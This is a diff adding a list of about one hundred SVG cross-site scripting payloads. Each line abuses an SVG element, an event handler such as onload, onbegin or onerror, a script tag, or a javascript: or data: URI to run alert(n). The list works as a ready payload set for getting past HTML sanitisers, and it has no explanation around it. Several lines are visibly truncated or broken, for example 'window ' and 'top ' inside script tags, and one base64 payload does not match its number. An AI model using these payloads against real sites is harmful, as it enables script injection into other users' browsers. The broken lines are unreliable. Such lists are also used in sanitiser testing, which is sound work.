@@ -1,0 +1,100 @@
+<svg onload=alert(1)>
+<svg xmlns="http://www.w3.org/2000/svg" onload=alert(2)>
+<svg><script>alert(3)</script></svg>
+<svg><desc><![CDATA[</desc><script>alert(4)</script>]]></svg>
+<svg><a xlink:href="javascript:alert(5)">X</a></svg>
+<svg><foreignObject onload=alert(6)></foreignObject></svg>
+<svg><set attributeName="x" to="1" begin="0s" onbegin="alert(7)"/></svg>
+<svg><animate attributeName="x" from="0" to="100" begin="0s" dur="1s" onbegin="alert(8)"/></svg>
+<svg><circle onmouseover="alert(9)" r="50"/></svg>
+<svg><rect width="300" height="100" onmouseover="alert(10)"/></svg>
+<svg onmouseenter=alert(11)></svg>
+<svg onmouseover=alert(12)></svg>
+<svg onfocus=alert(13) tabindex=1></svg>
+<svg><animateTransform onbegin=alert(14) attributeName="transform" type="rotate" from="0" to="360" dur="1s" repeatCount="1"/></svg>
+<svg><script xlink:href="data:text/javascript,alert(15)"/></svg>
+<svg><a xlink:href="javascript:alert(16)">click</a></svg>
+<svg><image xlink:href="x" onerror="alert(17)"/></svg>
+<svg><use xlink:href="#x" onerror=alert(18)/></svg>
+<svg><path id="x" d="" onmouseover=alert(19)/></svg>
+<svg><g onload=alert(20)></g></svg>
+<svg><text onmouseover=alert(21)>X</text></svg>
+<svg><marker onmouseover=alert(22)/></svg>
+<svg><pattern onmouseover=alert(23)/></svg>
+<svg><mask onmouseover=alert(24)/></svg>
+<svg><switch onmouseover=alert(25)></switch></svg>
+<svg><symbol onmouseover=alert(26)/></svg>
+<svg><view onmouseover=alert(27)/></svg>
+<svg><feImage onerror=alert(28)/></svg>
+<svg><feMerge onmouseover=alert(29)/></svg>
+<svg><feTile onmouseover=alert(30)/></svg>
+<svg><script type="application/ecmascript">alert(31)</script></svg>
+<svg><script><![CDATA[alert(32)]]></script></svg>
+<svg><metadata><script>alert(33)</script></metadata></svg>
+<svg><title><![CDATA[</title><script>alert(34)</script>]]></svg>
+<svg><style><![CDATA[svg{animation-name: x;}@keyframes x{from{transform:rotate(0deg)}to{transform:rotate(360deg);animation-name:x;animation-duration:1s;}}]]></style><desc onanimationstart=alert(35)></desc></svg>
+<svg onpointerenter=alert(36)></svg>
+<svg><g><animate attributeName="x" begin="0s" dur="1s" fill="freeze" onbegin="alert(37)"/></g></svg>
+<svg><foreignObject><body onload=alert(38)></body></foreignObject></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(39)</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(40)"/>
+<svg width="100" height="100"><circle cx="50" cy="50" r="40" fill="red" onclick="alert(41)"/></svg>
+<svg><text x="10" y="20" onclick="alert(42)">Click</text></svg>
+<svg><image href="x" onerror="alert(43)"/></svg>
+<svg><image href="x" onload="javascript:alert(44)"/></svg>
+<svg><script xlink:href="data:text/javascript;base64,YWxlcnQoNSk="/></svg>
+<svg><animate attributeName="x" begin="click" dur="1s" onbegin="alert(46)"/></svg>
+<svg><set attributeName="visibility" to="hidden" begin="0s" onbegin="alert(47)"/></svg>
+<svg><circle r="40" cx="50" cy="50" fill="green" onmousedown="alert(48)"/></svg>
+<svg><ellipse rx="100" ry="50" onclick="alert(49)"/></svg>
+<svg><line x1="0" y1="0" x2="200" y2="200" onclick="alert(50)"/></svg>
+<svg><polyline points="0,0 50,25 50,75 100,100" onclick="alert(51)"/></svg>
+<svg><polygon points="200,10 250,190 160,210" onclick="alert(52)"/></svg>
+<svg><path d="M150 0 L75 200 L225 200 Z" onclick="alert(53)"/></svg>
+<svg><desc onmouseenter="alert(54)">desc</desc></svg>
+<svg><title onmouseover="alert(55)">hover me</title></svg>
+<svg><g><a xlink:href="javascript:alert(56)">click</a></g></svg>
+<svg><a href="javascript:alert(57)">click</a></svg>
+<svg><circle onmousemove=alert(58) r="40"/></svg>
+<svg><rect width="100" height="50" onwheel=alert(59)/></svg>
+<svg><path d="M10 10 h 80 v 80 h -80 Z" onmouseout="alert(60)"/></svg>
+<svg><text dominant-baseline="middle" onclick=alert(61)>Text</text></svg>
+<svg><marker markerWidth="10" markerHeight="10" onmouseover=alert(62)/></svg>
+<svg><pattern width="10" height="10" onclick=alert(63)/></svg>
+<svg><mask id="m" onclick=alert(64)/></svg>
+<svg><symbol id="s" onclick=alert(65)/></svg>
+<svg><use xlink:href="#s" onclick=alert(66)/></svg>
+<svg><image xlink:href="invalid" onerror="alert(67)"/></svg>
+<svg><script type="text/javascript">alert(68)</script></svg>
+<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml" onclick="alert(69)">X</div></foreignObject></svg>
+<svg><g id="x" onmouseover="alert(70)"/></svg>
+<svg><path id="x" onfocusin="alert(71)" tabindex="0"/></svg>
+<svg><filter id="f" onload="alert(72)"/></svg>
+<svg><defs><script>alert(73)</script></defs></svg>
+<svg><feBlend onload="alert(74)"/></svg>
+<svg><feGaussianBlur stdDeviation="5" onclick="alert(75)"/></svg>
+<svg><feComponentTransfer onclick="alert(76)"/></svg>
+<svg><feComposite in2="BackgroundImage" operator="in" onclick="alert(77)"/></svg>
+<svg><clipPath onclick="alert(78)"/></svg>
+<svg><foreignObject><input onfocus=alert(79) autofocus/></foreignObject></svg>
+<svg><script>setTimeout(()=>{alert(80)},100)</script></svg>
+<svg><script>new Function('alert(81)')()</script></svg>
+<svg><script>eval('alert(82)')</script></svg>
+<svg><script>window </script></svg>
+<svg><script>this.alert(84)</script></svg>
+<svg><script>(()=>alert(85))()</script></svg>
+<svg><script>alert`\x38\x36`</script></svg>
+<svg><script>alert?.(87)</script></svg>
+<svg><script>alert?.(88)</script></svg>
+<svg><script src="data:text/javascript,alert(89)"></script></svg>
+<svg><script src="data:text/javascript;base64,YWxlcnQoOTAp"></script></svg>
+<svg><g><a xlink:href="data:text/html,<script>alert(91)</script>">x</a></g></svg>
+<svg><image onerror=top  src=x/></svg>
+<svg><text onclick=parent.alert(93)>Click</text></svg>
+<svg><use xlink:href="x" onerror="alert(94)"/></svg>
+<svg><set attributeName="x" to="1" begin="indefinite" onbegin="alert(95)"/></svg>
+<svg><g id="a" onactivate="alert(96)"/></svg>
+<svg><script>document.write('<img src=x onerror=alert(97)>')</script></svg>
+<svg><script>location='javascript:alert(98)'</script></svg>
+<svg><script>top </script></svg>
+<svg><script>document.body.innerHTML='<svg onload=alert(100)>'</script></svg>
